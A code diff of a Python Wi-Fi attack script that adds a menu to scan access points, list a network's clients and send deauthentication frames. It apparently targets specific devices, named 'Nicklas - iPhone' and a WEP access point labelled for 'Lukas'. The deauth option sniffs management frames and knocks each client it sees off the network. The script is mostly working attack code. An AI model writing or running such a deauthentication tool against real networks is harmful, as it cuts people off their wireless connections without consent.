@@ -21,38 +21,42 @@ INTERFACE = "wlan0"
 TIMEOUT = 20
 
 AP_TO_ATTACK = "Nicklas - iPhone"
-
-
-WEP_AP_BSSID = "48:f8:b3:e4:03:04"  # temp
+Lukas_WEP_AP = "48:f8:b3:e4:03:04"
 
 with Scanner(INTERFACE) as scanner:
-    # AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
-    AP_info = scanner.get_ap(timeout=TIMEOUT)
-    print(AP_info)
-    print(scanner.wifis)
-    channel = AP_info.Channel[0]
-    BSSID = AP_info.index[0]
 
-    # change channel to be on APs channelwifi: Wifi
-    scanner.set_channel(channel)
-    print(f"Channel is: {scanner.curr_channel}")
-    # Deauth clients
+    action = input("Input action wanted:\n1. Scan network.\n2. Show clients\n3. Send deauth\n")
 
-    def check_deauth(pkt):
-        print("Recived package")
-        elt = pkt[Dot11Elt]
-        while elt and elt.ID != 0:
-            elt = elt.payload[Dot11Elt]
-        print(elt.info)
-        # if pkt[Dot11].addr1 == BSSID:
-        deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
+    if action == "1":
+        # AP_info = scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_TO_ATTACK)
+        AP_info = scanner.get_ap(timeout=TIMEOUT)
+        print(AP_info)
+        print(scanner.wifis)
+        channel = AP_info.Channel[0]
+        BSSID = AP_info.index[0]
 
-    print("Extracting client list for AP: 'bridge'")
+        # change channel to be on APs channelwifi: Wifi
+        scanner.set_channel(channel)
+        print(f"Channel is: {scanner.curr_channel}")
 
-    client_list = get_clients_on_ap(TIMEOUT, INTERFACE, WEP_AP_BSSID)
-    print(client_list)
+    elif action == "2":
+        target_ap = input("Input AP BSSID for client scan: ")
+        print(f"Extracting client list for AP: {target_ap}")
+        client_list = get_clients_on_ap(TIMEOUT, INTERFACE, target_ap)
+        print(client_list)
 
-    # sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt")  # subtype assoc-req")  # start sniffin
+    elif action == "3":
+
+        def check_deauth(pkt):
+            print("Recived package")
+            elt = pkt[Dot11Elt]
+            while elt and elt.ID != 0:
+                elt = elt.payload[Dot11Elt]
+            print(elt.info)
+            # if pkt[Dot11].addr1 == BSSID:
+            deauth(INTERFACE, BSSID, pkt[Dot11].addr2, 6)
+
+        sniff(iface=INTERFACE, prn=check_deauth, filter="type mgt")  # subtype assoc-req")  # start sniffin
 
 
 # channel = AP_info.Channel[0]
